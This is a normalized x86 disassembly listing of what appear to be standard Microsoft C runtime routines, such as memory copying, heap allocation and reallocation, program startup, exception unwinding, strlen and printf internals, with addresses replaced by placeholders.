jmp [ edx * 4 + jump_table_40ff44 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_4100e0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40ff44 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40ff44 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40ff44 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4100e0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4100e0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4100e0 ]
sub_410135
push 0xc
push r--data
call sub_4143e0
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_414425
retn
cmp [ rw-data ] 0x3
jne r-xdata
push esi
push 0x4
call sub_417d23
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_417d56
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
call sub_410cee
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_410cac
mov [ esi ] eax
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41018b
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
push esi
push eax
call sub_417d89
pop ecx
pop ecx
push [ ebp + 0x8 ]
jmp r-xdata
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
sub_4101c3
push 0xc
push r--data
call sub_4143e0
and [ ebp - 0x1c ] 0x0
mov esi [ ebp + 0x8 ]
cmp esi [ rw-data ]
ja r-xdata
mov eax [ ebp - 0x1c ]
call sub_414425
retn
push 0x4
call sub_417d23
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_418538
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_410209
sub_410212
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0xffffffe0
ja r-xdata
push esi
call sub_417547
pop ecx
call sub_410cee
mov [ eax ] 0xc
xor eax eax
push ebx
push edi
mov edi [ HeapAlloc@IAT ]
mov eax [ rw-data ]
cmp eax 0x1
jne r-xdata
call sub_4189c8
push 0x1e
call sub_41881d
push 0xff
call sub_41412b
cmp eax 0x3
jne r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
push esi
call sub_4101c3
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
mov eax esi
jmp r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
inc esi
mov ebx eax
test ebx ebx
jne r-xdata
push 0x0
push [ rw-data ]
call edi
push eax
jmp r-xdata
pop edi
mov eax ebx
pop ebx
jmp r-xdata
push 0xc
pop esi
cmp [ rw-data ] eax
je r-xdata
pop esi
pop ebp
retn
call sub_410cee
mov [ eax ] esi
push [ ebp + 0x8 ]
call sub_417547
pop ecx
test eax eax
je r-xdata
call sub_410cee
mov [ eax ] esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
sub_4102dc
push 0x10
push r--data
call sub_4143e0
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_410212
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
push ebx
call sub_410135
pop ecx
jmp r-xdata
call sub_414425
retn
cmp esi 0xffffffe0
jbe r-xdata
xor edi edi
mov [ ebp - 0x1c ] edi
cmp esi 0xffffffe0
ja r-xdata
xor eax eax
test esi esi
jne r-xdata
push esi
call sub_417547
pop ecx
call sub_410cee
push 0x4
call sub_417d23
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_417d56
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
inc esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_410420
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
cmp esi [ rw-data ]
ja r-xdata
mov eax edi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
mov edi [ ebp - 0x1c ]
test esi esi
jne r-xdata
cmp [ ebp - 0x1c ] edi
jne r-xdata
push esi
push ebx
push eax
call sub_418257
add esp 0xc
test eax eax
je r-xdata
test edi edi
jne r-xdata
push esi
call sub_417547
pop ecx
test eax eax
je r-xdata
cmp [ rw-data ] edi
je r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
jmp r-xdata
inc esi
cmp esi edi
jne r-xdata
push esi
call sub_418538
pop ecx
mov [ ebp - 0x1c ] eax
cmp eax edi
je r-xdata
mov [ ebp - 0x1c ] ebx
jmp r-xdata
call sub_410cee
call sub_410cee
jmp r-xdata
test edi edi
jne r-xdata
push esi
call sub_417547
pop ecx
test eax eax
jne r-xdata
test edi edi
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push edi
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ ebp - 0x1c ] eax
cmp eax edi
je r-xdata
xor esi esi
inc esi
mov [ ebp + 0xc ] esi
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_410cac
pop ecx
mov [ esi ] eax
jmp r-xdata
call sub_410cee
cmp [ ebp - 0x20 ] edi
je r-xdata
call sub_410cee
cmp [ ebp - 0x20 ] edi
jne r-xdata
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
push eax
push ebx
push [ ebp - 0x1c ]
call sub_4158c0
push ebx
call sub_417d56
mov [ ebp - 0x20 ] eax
push ebx
push eax
call sub_417d89
add esp 0x18
mov eax esi
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_410cac
mov [ esi ] eax
pop ecx
mov [ eax ] 0xc
jmp r-xdata
mov [ eax ] 0xc
push eax
push ebx
push [ ebp - 0x1c ]
call sub_4158c0
push ebx
push [ ebp - 0x20 ]
call sub_417d89
add esp 0x14
mov eax esi
sub_410520
push 0x14
push r--data
call sub_4143e0
mov eax 0x5a4d
cmp [ __dos_header ] ax
jne r-xdata
and [ ebp - 0x1c ] 0x0
mov eax [ r--data ]
cmp [ eax + __dos_header ] 0x4550
jne r-xdata
call sub_4138d5
test eax eax
jne r-xdata
push 0x1c
call sub_4104f7
mov ecx 0x10b
cmp [ eax + r--data ] cx
jne r-xdata
call sub_418ebb
and [ ebp - 0x4 ] 0x0
call sub_4165c7
test eax eax
jge r-xdata
push 0x10
call sub_4104f7
cmp [ eax + r--data ] 0xe
jbe r-xdata
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_418d84
mov [ rw-data ] eax
call sub_418cc9
test eax eax
jge r-xdata
push 0x1b
call sub_4140d7
pop ecx
xor ecx ecx
cmp [ eax + r--data ] ecx
setne cl
mov [ ebp - 0x1c ] ecx
jmp r-xdata
call sub_418a51
test eax eax
jge r-xdata
push 0x8
call sub_4140d7
pop ecx
push 0x1
call sub_417b77
pop ecx
test eax eax
jne r-xdata
push 0x1
call sub_414196
pop ecx
test eax eax
je r-xdata
push 0x9
call sub_4140d7
pop ecx
mov eax [ rw-data ]
mov [ rw-data ] eax
push eax
push [ rw-data ]
push [ rw-data ]
call sub_401ae0
add esp 0xc
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
push eax
call sub_4140d7
pop ecx
call sub_414373
jmp sub_410662
push eax
call sub_414347
sub_410680
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_41070b
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
pop edi
mov [ ebp - 0x4 ] eax
pop esi
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
leave
retn 0x8
test [ eax ] 0x8
je r-xdata
mov [ ebp - 0xc ] 0x1994000
sub_410757
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov ebp [ ebp - 0x4 ]
mov esp [ ebx - 0x4 ]
jmp eax
sub_410790
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov esi [ fs : 0x0 ]
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call RtlUnwind
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and eax 0xfffffffd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov edi [ fs : 0x0 ]
mov ebx [ ebp - 0x4 ]
mov [ ebx ] edi
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_4107e4
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_419b70
add esp 0x20
mov [ ebp - 0x8 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_41081a
mov edi edi
push ebp
mov ebp esp
push esi
cld
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
xor ecx esi
call sub_40e1e0
push 0x0
push esi
push [ esi + 0x14 ]
push [ esi + 0xc ]
push 0x0
push [ ebp + 0x10 ]
push [ esi + 0x10 ]
push [ ebp + 0x8 ]
call sub_419b70
add esp 0x20
pop esi
pop ebp
retn
sub_41084d
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
push ebx
cmp [ ebp + 0x8 ] 0x123
jne r-xdata
and [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] sub_410924
mov eax [ rw-data ]
lea ecx [ ebp - 0x28 ]
xor eax ecx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x10 ] eax
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] esp
mov [ ebp - 0x8 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x38 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x30 ] eax
call sub_41371e
mov eax [ eax + 0x80 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ ebp - 0x2c ]
pop ecx
pop ecx
and [ ebp - 0x38 ] 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x28 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
pop ebx
leave
retn
mov eax [ ebp - 0x38 ]
sub_410924
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
cld
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x8 ]
xor ecx [ ebp + 0xc ]
call sub_40e1e0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x18 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
push [ ebp + 0x8 ]
call sub_419b70
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
xor eax eax
inc eax
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x123
call sub_41084d
add esp 0x1c
mov eax [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp eax
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_410790
pop ebx
leave
retn
sub_4109c3
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x10 ]
mov esi [ edi + 0xc ]
mov [ ebp - 0x4 ] eax
mov ebx esi
jmp r-xdata
mov [ ebp + 0x8 ] esi
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebp + 0x14 ]
inc esi
mov [ eax ] esi
mov eax [ ebp + 0x18 ]
mov [ eax ] ebx
cmp ebx [ edi + 0xc ]
ja r-xdata
mov ecx [ ebp - 0x4 ]
dec esi
mov eax esi
imul eax eax 0x14
add eax ecx
mov ecx [ ebp + 0x10 ]
cmp [ eax + 0x4 ] ecx
jge r-xdata
call sub_419ca2
call sub_419ca2
cmp esi ebx
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
cmp ecx [ eax + 0x8 ]
jle r-xdata
mov eax esi
imul eax eax 0x14
add eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0xc ] 0x0
jge r-xdata
dec [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
sub_410a38
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
call sub_41371e
mov eax [ eax + 0x98 ]
mov [ esi + 0x4 ] eax
call sub_41371e
mov [ eax + 0x98 ] esi
mov eax esi
pop esi
pop ebp
retn
sub_410a64
mov edi edi
push ebp
mov ebp esp
call sub_41371e
mov eax [ eax + 0x98 ]
jmp r-xdata
test eax eax
jne r-xdata
mov ecx [ eax ]
cmp ecx [ ebp + 0x8 ]
je r-xdata
inc eax
pop ebp
retn
xor eax eax
pop ebp
retn
mov eax [ eax + 0x4 ]
sub_410a8b
mov edi edi
push ebp
mov ebp esp
push esi
call sub_41371e
mov esi [ ebp + 0x8 ]
cmp esi [ eax + 0x98 ]
jne r-xdata
call sub_41371e
mov eax [ eax + 0x98 ]
jmp r-xdata
call sub_41371e
mov ecx [ esi + 0x4 ]
mov [ eax + 0x98 ] ecx
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ eax + 0x4 ]
cmp esi ecx
je r-xdata
pop esi
pop ebp
jmp sub_419ca2
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov eax ecx
pop esi
pop ebp
retn
sub_410add
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
and [ ebp - 0x18 ] 0x0
lea ecx [ ebp - 0x18 ]
xor eax ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
inc eax
mov [ ebp - 0x14 ] sub_41081a
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_419cf0
mov ecx eax
mov eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_410b3d
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_410b70
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_410ba6
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call sub_41487e
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call sub_41487e
pop ecx
sub_410cac
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ecx * 8 + rw-data ]
pop ebp
retn
inc ecx
cmp ecx 0x2d
jb r-xdata
cmp eax [ ecx * 8 + rw-data ]
je r-xdata
lea ecx [ eax - 0x13 ]
cmp ecx 0x11
ja r-xdata
add eax 0xffffff44
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_410d14
mov edi edi
push ebp
mov ebp esp
push esi
call sub_410d01
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_410cac
pop ecx
mov esi eax
call sub_410cee
mov [ eax ] esi
pop esi
pop ebp
retn
sub_410d37
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_40fd92
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_410cee
mov [ eax ] 0x9
push ebx
xor ebx ebx
test al 0x1
je r-xdata
call sub_410cee
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x4 ] ebx
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_41490a
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
or eax 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
xor edi edi
inc edi
push edi
lea eax [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
call sub_416358
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
dec ecx
cmp edi ebx
mov [ esi + 0x4 ] ecx
jle r-xdata
push [ ebp + 0xc ]
call sub_419f23
pop ecx
test eax eax
jne r-xdata
call sub_41490a
add eax 0x40
cmp esi eax
jne r-xdata
pop ebx
mov eax [ ebp + 0x8 ]
and eax 0xff
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_416358
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_419eda
pop ecx
pop edi
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push ebx
push ebx
push ecx
call sub_419dc1
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_410e9b
test [ ecx + 0xc ] 0x40
je r-xdata
dec [ ecx + 0x4 ]
js r-xdata
cmp [ ecx + 0x8 ] 0x0
je r-xdata
movsx eax al
push ecx
push eax
call sub_410d37
pop ecx
pop ecx
mov edx [ ecx ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ esi ]
retn
or [ esi ] eax
retn
cmp eax 0xffffffff
jne r-xdata
sub_410ece
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ebp + 0x8 ]
dec [ ebp + 0xc ]
call sub_410e9b
cmp [ esi ] 0xffffffff
je r-xdata
pop esi
pop ebp
retn
sub_410ef4
mov edi edi
push ebp
mov ebp esp
test [ edi + 0xc ] 0x40
push ebx
push esi
mov esi eax
mov ebx ecx
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov al [ ebx ]
dec [ ebp + 0x8 ]
mov ecx edi
call sub_410e9b
inc ebx
cmp [ esi ] 0xffffffff
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
add [ esi ] eax
jmp r-xdata
call sub_410cee
cmp [ eax ] 0x2a
jne r-xdata
mov ecx edi
mov al 0x3f
call sub_410e9b
sub_410f41
mov edi edi
push ebp
mov ebp esp
sub esp 0x278
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x25c ]
mov [ ebp - 0x24c ] esi
mov [ ebp - 0x224 ] edi
mov [ ebp - 0x248 ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x230 ] eax
mov [ ebp - 0x240 ] eax
mov [ ebp - 0x238 ] eax
call sub_40e5f8
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_410cee
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40edf4
add esp 0x14
cmp [ ebp - 0x250 ] 0x0
je r-xdata
xor ecx ecx
cmp ebx ecx
je r-xdata
push esi
call sub_40fd92
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ ebx ]
mov [ ebp - 0x228 ] ecx
mov [ ebp - 0x220 ] ecx
mov [ ebp - 0x244 ] ecx
mov [ ebp - 0x211 ] dl
test dl dl
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40e1e0
leave
retn
cmp [ ebp - 0x250 ] 0x0
je r-xdata
inc ebx
cmp [ ebp - 0x228 ] 0x0
mov [ ebp - 0x23c ] ebx
jl r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp - 0x228 ]
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
mov al dl
sub al 0x20
cmp al 0x58
ja r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
xor esi esi
xor eax eax
movsx eax dl
movsx eax [ eax + r--data ]
and eax 0xf
xor esi esi
jmp r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov ebx [ ebp - 0x23c ]
mov al [ ebx ]
mov [ ebp - 0x211 ] al
test al al
je r-xdata
